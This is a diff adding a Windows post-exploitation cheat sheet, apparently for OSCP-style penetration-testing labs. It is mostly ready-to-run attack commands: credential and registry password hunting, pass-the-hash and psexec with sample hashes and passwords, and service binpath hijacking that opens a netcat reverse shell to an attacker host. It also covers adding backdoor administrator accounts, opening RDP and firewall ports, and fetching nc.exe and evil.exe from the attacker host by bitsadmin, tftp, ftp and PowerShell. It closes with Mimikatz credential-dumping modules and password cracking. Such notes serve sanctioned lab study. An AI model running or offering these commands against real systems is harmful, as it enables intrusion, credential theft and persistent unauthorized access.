@@ -1,0 +1,678 @@
+######################################################################
+INFORMATION GATHERING
+#######################################################################
+
+What system are we connected to?
+- systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+What is the windows architecture. 32 or 64 bit
+- wmic os get osarchitecture
+
+Get the hostname and username (if available)
+- echo %username%
+
+List other users on the box
+- net users
+
+Networking/Routing Info
+- ipconfig /all
+- route print
+- arp -A
+
+ Active Network Connections
+- netstat -ano
+
+
+Firewall Status (only on Win XP SP2 and above)
+- netsh firewall show state
+- netsh firewall show config
+- netsh advfirewall firewall show rule all
+
+Scheduled tasks
+schtasks /query /fo LIST /v
+
+Check how Running processes link to started services
+- tasklist /SVC
+
+Windows services that are started:
+- net start
+
+Driver madness (3rd party drivers may have holes)
+- DRIVERQUERY
+
+Check systeminfo output against exploit-suggester
+- https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+- python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
+
+Run windows-privesc script
+https://github.com/pentestmonkey/windows-privesc-check
+
+
+##############################################################################################################################
+EXPLOIT SUGGESTER - Check systeminfo output against exploit-suggester 
+##############################################################################################################################
+
+- /ftphome/priv-esc/windows/bat-files/CopyAndPasteEnum.bat      // enum script
+- ~/Desktop/oscp-master/priv-esc/windows/Windows-Exploit-Suggester // exploit suggester
+
+- Step 1: run 'sysinfo' or 'systeminfo' command on victim machine:
+- Step 2:  python windows-exploit-suggester.py --database 2018-04-02-mssb.xls --systeminfo alice-sysinfo.txt
+
+
+
+
+##############################################################################################################################
+PSEXEC
+##############################################################################################################################
+FROM LINUX
+
+syntax: python psexec.py username:password@target-address "cmd.exe"
+syntax2:python psexec.py username:LM:NTLM@target-address "cmd.exe" 
+
+python /usr/share/doc/python-impacket/examples/psexec.py godson:Pass123@10.11.1.73 "cmd.exe"
+
+
+FROM WINDOWS
+- Exec commands on remote Windows machine
+- PsExec.exe \\10.11.1.49 -u alice -p somepasswd cmd
+
+
+
+
+############################################################################################################################
+PASS-THE-HASH
+############################################################################################################################
+
+From Windows
+
+- winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //10.11.1.49 cmd.exe
+
+after % starts the password
+aad3b435b51404eeaad3b435b51404ee: is the blnk LM hash
+
+- wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE alice@localhost
+
+
+From Linux
+
+python /usr/share/doc/python-impacket/examples/psexec.py -hashes :2d518fe330e2ac13eca1b3259eae5db1 jill@10.11.1.73 "cmd.exe"
+
+
+
+##############################################################################################################################
+NETCAT
+##############################################################################################################################
+
+On sending machine:
+nc -w 3 [destination] 1234 < send.file
+
+on receiving end:
+nc.exe -lvp 2222 > PsExec.exe
+
+
+
+
+##########################################################################################################################
+REMOTE DESKTOP - Getting GUI
+##########################################################################################################################
+XFREERDP TOOL
+
+xfreerdp /u:alice /v:10.11.1.49:3389  //use this tool if you get rdesktop errors
+
+
+Add Windows user:
+- net user godson Pass123 /add
+
+Add this user to Administrators groups
+- net localgroup administrators godson /add
+
+Add user to Remote Desktop user group
+- net localgroup "Remote Desktop users" godson /add
+
+Start Remote Desktop service
+- net start TermService
+
+Is Remote Desktop Service running?
+- tasklist /svc | findstr /C:TermService
+
+Permanently enable Terminal Services
+- sc config TermService start= auto
+
+change startup type
+- REG add HKLM\SYSTEM\CurrentControlSet\Services\TermServices" /v Start /t REG_DWORD /d2 /f
+
+open firewall
+- netsh firewall set service type = remotedesktop mode = enable
+
+- Enable Terminal services through registry  // reboot after
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+enable rdp port 
+netsh firewall set portopening protocol = TCP port = 3389 name = "Remote Desktop Protocol" mode = ENABLE
+netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+
+- Reboot
+shutdown /r
+
+Add RDP port
+add portopening TCP 3389 "Remote Desktop"
+
+
+
+
+
+##########################################################################################################################
+WMIC - Windows Management Instrumentation Command Line
+##########################################################################################################################
+
+(Windows XP requires admin)
+
+Use wmic_info.bat script for automation
+- http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
+
+Check patch level
+- wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+1. Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
+
+2. After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing
+
+3. Search patches for given patch
+ - wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+Example :Windows 2K SP4 – Windows 7 (x86): KiTrap0D (KB979682) 
+- wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682"
+- wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"
+
+
+
+
+###########################################################################################################################
+STORED CREDENTIALS
+###########################################################################################################################
+
+Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.
+
+
+- C:\sysprep.inf
+- C:\sysprep\sysprep.xml
+- %WINDIR%\Panther\Unattend\Unattended.xml
+- %WINDIR%\Panther\Unattended.xml
+
+When the box is connected to a Domain:
+
+1. Look for Groups.xml in SYSVOL
+ GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.
+
+2. Search for other policy preference files that can have the optional “cPassword” attribute set:
+
+- Services\Services.xml: Element-Specific Attributes
+ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+Printers\Printers.xml: SharedPrinter Element
+Drives\Drives.xml: Element-Specific Attributes
+DataSources\DataSources.xml: Element-Specific Attributes
+
+
+
+
+##############################################################################################################################
+SEARCH FILESYSTEM
+#############################################################################################################################
+
+Search for specific keywords:
+- dir /s *secret* == *pass* == *cred* == *vnc* == *.config*
+
+Search certain file types for a keyword
+- findstr /si password *.xml *.ini *.txt
+- findstr /S pass *.txt *.xml *.ini  // in C:\
+
+Search for certain files
+- dir /b /s unattend.xml
+- dir /b /s web.config
+- dir /b /s sysprep.inf
+- dir /b /s sysprep.xml
+- dir /b /s *pass*
+- dir /b /s vnc.ini
+
+Grep the registry for keywords (e.g. “passwords”)
+- reg query HKLM /f password /t REG_SZ /s
+- reg query HKCU /f password /t REG_SZ /s
+- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+- reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+- reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+- reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+Find writeable files
+dir /a-r-d /s /b
+
+-  /a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we’re looking for writable files only.
+- /s means recurse subdirectories
+- /b means bare format. Path and filename only.
+
+
+
+
+##############################################################################################################################
+TRUSTED SERVICES
+#############################################################################################################################
+
+To check if we can write to the path and plant a backdoor
+
+1. List all unquoted service paths (minus built-in Windows services) on our compromised machine:
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+Suppose we found:
+
+C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+
+If you look at the registry entry for this service with Regedit you can see the ImagePath value is:
+C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+
+To be secure it should be like this:
+“C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”
+
+When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files(x86)\Program Folder\A.exe
+
+2. Check permissions of folder path
+
+icacls "C:\Program Files (x86)\Program Folder"
+
+3. If we can write in the path we plant a backdoor with the same name with the service and restart the service.
+
+
+
+
+
+##############################################################################################################################
+VULNERABLE SERVICES - accesschk.exe
+##############################################################################################################################
+
+1. For Windows XP, version 5.2 of accesschk is needed:
+https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
+
+- accesschk.exe /accepteula (always do this first!!!!!)
+- accesschk.exe -uwcqv "Authenticated Users" * /accepteula (won't yield anything on Win 8)
+- accesschk.exe -ucqv [service_name] /accepteula (requires sysinternals accesschk!)
+- accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
+- accesschk.exe -qdws Users C:\Windows\
+
+
+2. Find all weak file permissions per drive.
+- accesschk.exe -uwqs Users c:\*.*
+- accesschk.exe -uwqs "Authenticated Users" c:\*.*
+
+Then query the service using Windows sc:
+sc qc <vulnerable service name>
+
+3.  Binary planting 
+Then change the binpath to execute your own commands (restart of the service will most likely be needed):
+
+- sc config servicenamehere start= auto //enabling service
+- sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe" 
+- sc config [service_name] obj= ".\LocalSystem" password= ""
+- sc qc [service_name] (to verify!)
+- net start [service_name]
+
+ALSO //for adding user to as admin. note that we can use user.c file to automate this
+
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
+sc stop <vuln-service>
+sc start <vuln-service>
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
+sc stop <vuln-service>
+sc start <vuln-service>
+
+
+Note – Might need to use the depend attribute explicitly:
+
+sc stop <vuln-service>
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+sc start <vuln-service>
+
+
+
+
+################################################################################################################################
+HASHCAT 
+################################################################################################################################
+hashcat -m 1000 has_file rockyou.txt
+
+
+
+###############################################################################################################################
+GOLDEN TICKET - generating kerberos golden ticket
+############################################################################################################################### 
+
+Information gathering
+
+Things we need to generate golden ticket
+
+1. Domain
+2. Domain Admin User
+3. Domain SID
+4. krbtgt hash from DC
+
+- echo %LOGONSERVER%
+- set (to view key information about the pc and domain)
+- whoami (domain\username)
+- net localgroup administrator /Domain (to check what privileges and groups the admin use is in)
+- whoami /user (to get domain SID) - remember to remove the last four digit to get the domain SID
+
+Token stealing and impersonation (Note: must have domain admin right)
+
+- 
+
+
+
+################################################################################################################################
+BYPASSING ANTIVIRUS
+###############################################################################################################################
+
+Use Veil-Evasion
+Create your own executable by “compiling” PowerShell scripts
+
+
+
+###############################################################################################################################
+PORT FORWARDING
+###############################################################################################################################
+
+-   Port Forwarding - accept traffic on a given IP address and port and
+    redirect it to a different IP address and port
+
+    -   cat /etc/rinetd.conf
+    -   /etc/init.d/rinetd restart
+    -   netstat -tap
+        bindadress bindport connectaddress connectport
+Example: 10.11.0.221 80 10.11.1.31 3389
+
+
+- From the windows machine, use "remote desktop" to our machine and indicate port. e.g 10.11.0.221:80
+- Check /etc/rinetd.conf to make user our redirect address is set
+
+#############################################################################################################################
+SSH TUNNELLING
+#############################################################################################################################
+
+Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network
+
+  Tunnel on port 22
+
+- plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
+- Port 22 blocked? Try port 80? or 443?
+- plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 80 -v
+- plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -v
+- plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   ##redirects the Windows port 445 to Kali on port 22
+- Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)
+
+
+ Windows machine add required firewall rules without prompting the user
+
+- netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes
+- netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000
+- netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080
+- netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
+
+
+
+
+##############################################################################################################################
+BITADMIN
+##############################################################################################################################
+
+BitAdmin File Transfer
+- bitsadmin /transfer myDownloadJob /download /priority normal http://10.11.0.221/nc.exe c:\Users\Bethany\nc.exe
+
+- icacls * //use this to check for file write permission
+
+###############################################################################################################################
+INTERNET EXPLORER FILE TRANSFER
+###############################################################################################################################
+
+- Rename file to .jpg in remote server e.g nc.jpg
+- cd Program Files\Internet Explorer
+- Start iexplore.exe http://10.11.0.221/nc.jpg
+- File will be in c:\\documents and settings\offec\local settings\temporary internet files
+- Rename nc.jpg to nc.exe on target
+
+
+
+##############################################################################################################################
+TFTP
+#############################################################################################################################
+
+Windows XP and Win 2003 contain tftp client. Windows 7 do not by default
+
+tfpt clients are usually non-interactive, so they could work through an obtained shell
+
+- atftpd --daemon --port 69 /tftp
+
+- tftp -i 10.11.0.221 GET nc.exe
+
+
+
+
+###############################################################################################################################
+FTP
+##############################################################################################################################
+
+echo open 10.11.0.221 21> ftp.txt
+echo USER free free >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+
+
+
+###############################################################################################################################
+POWERSHELL
+###############################################################################################################################
+
+FILE DOWNLOAD
+
+$storageDir = $pwd 
+$webclient = New-Object System.Net.WebClient 
+$url = "http://10.11.0.0.221:8000/runas.ps1" 
+$file = "runas.ps1" 
+$webclient.DownloadFile($url,$file)
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+To run script:
+powershell -noexit & “C:\Documents and Settings\poshoholic\My Documents\wget.ps1”
+
+
+LOGON HISTORY
+- Enter command set-ExecutionPolicy RemoteSigned
+- Use script logon-history.ps1 to show logged on users
+
+#########################################################################################################################
+
+COPY FILES FROM LHOST TO RHOST VIA SMB
+#########################################################################################################################
+mput files //for putting
+mget files //for getting
+
+
+########################################################################################################################
+UPNP SERVICES
+#######################################################################################################################
+
+universal plug and play
+
+Change the upnp service binary
+- sc qc upnphostsc config upnphost binpath= "net user /add"
+- sc config upnphost obj= ".\LocalSystem" password =""
+- net stop upnphost
+- net start upnphost
+
+
+######################################################################################################################
+SYSINTERNALS
+######################################################################################################################
+
+== SYSINTERNALS ==
+-  Use the tools in https://github.com/crsftw/OSCP-cheat-sheet/tree/master/privesc/tools_win
+-  use the -accepteula to avoid the GUI asking to accept...EULA
+-  PsExec.exe –accepteula
+
+PsExec64.exe -accepteula \\10.11.1.49 -u user -p somepassword cmd
+powershell -ExecutionPolicy Bypass C:\Users\Public\PsExec.exe -accepteula \\localhost -u alice -p XXXX cmd
+
+    PsExec - execute processes remotely
+    PsFile - shows files opened remotely
+    PsGetSid - display the SID of a computer or a user
+    PsInfo - list information about a system
+    PsPing - measure network performance
+    PsKill - kill processes by name or process ID
+    PsList - list detailed information about processes
+    PsLoggedOn - see who's logged on locally and via resource sharing (full source is included)
+    PsLogList - dump event log records
+    PsPasswd - changes account passwords
+    PsService - view and control services
+    PsShutdown - shuts down and optionally reboots a computer
+    PsSuspend - suspends processes
+    PsUptime - shows you how long a system has been running since its last reboot (PsUptime's functionality has been incorporated into$
+
+
+
+#################################################################################################################################
+WINDOWS REGISTRY
+################################################################################################################################
+
+VNC Stored:
+- reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+Windows Autologin:
+- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+Is UAC enabled ?
+- REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+    EnableLUA    REG_DWORD    0x0  // NO
+    EnableLUA    REG_DWORD    0x1  // YES
+
+
+SNMP Parameters:
+- reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+Putty clear text proxy credentials:
+- reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+Search the registry - copy (pipe) to the clipboard (optional)
+- reg query HKLM /f password /t REG_SZ /s [ |clip]
+- reg query HKCU /f password /t REG_SZ /s [ |clip]
+
+
+
+#################################################################################################################################
+MIMIKATZ
+#################################################################################################################################
+
+-  SEKURLSA::LogonPasswords full - displays password of current users
+
+-  CRYPTO::Certificates – list/export certificates
+
+-  KERBEROS::Golden – create golden/silver/trust tickets
+
+-  KERBEROS::List – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.
+
+-  KERBEROS::PTT – pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).
+
+-  LSADUMP::DCSync – ask a DC to synchronize an object (get password data for account). No need to run code on DC.
+
+-  LSADUMP::LSA – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”
+
+-  LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
+
+-  LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
+
+-  MISC::AddSid – Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.
+
+-  MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials.
+
+-  MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.
+
+-  PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
+
+-  SEKURLSA::Ekeys – list Kerberos encryption keys
+
+-  SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users (including services and computer account)
+
+-  SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password data
+
+-  SEKURLSA::LogonPasswords – lists all available provider credentials. This usually shows recently logged on user and computer credentials.
+
+-  SEKURLSA::Pth – Pass- theHash and Over-Pass-the-Hash
+
+-  SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
+
+-  TOKEN::List – list all tokens of the system
+
+-  TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box
+
+-  TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin credentials.
+
+
+
+
+#################################################################################################################################
+JOHN THE RIPPER - Bruteforce shadow and etc
+##################################################################################################################################
+
+- Get the etc nd shadow and save as etc-pass and etc-shadow and save in /tmp 
+- /usr/sbin/unshadow /tmp/tophat-passwd /tmp/tophat-shadow > combined_pass.db
+- john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined_pass.db
+- john --show /tmp/combined_pass.db
+
+--OUTPUT--
+
+root@kali:/tmp# john --show  /tmp/combined_pass.db
+bob:BUGZBUNNY:500:500::/home/bob:/bin/bash
+alice:loading1:501:501::/home/alice:/bin/bash
+
+
+
+
+
+##################################################################################################################################
+CONVERT PYTHON SCRIPT TO EXE
+##################################################################################################################################
+convert python exploits to windows executable
+
+Download the exploit:
+- wget -O ms11-080.py http://www.exploit-db.com/download/18176
+
+Convert python to Windows executable. Works only on a Windows machine
+- first install pywin32-218.win32-py2.7
+- copy the exploit code to the Windows machine (via http server) and save as  .txt
+- rename the exploit from .txt to .py e.g move ms11-080.txt ms11-080.py
+
+Compile to .exe (be in the pyinstaller folder)
+- python pyinstaller.py -­‐onefile ms11-­080.py
+- the .exe will be located in the pyinstaller, ms11-080 subdirectory / dist
+
+Copy the .exe in the webroot folder and download it to the victom machine with a web browser
+
+run the exploit on a limited user account
+and you will get SYSTEM shell
+
+
+
+
+###################################################################################################################################
+DOWNLOAD LINKS
+##################################################################################################################################
+
+https://pentestlab.blog/tag/local-exploits/  //for windows popular exploits
+
+##################################################################################################################################
+
+
+END...
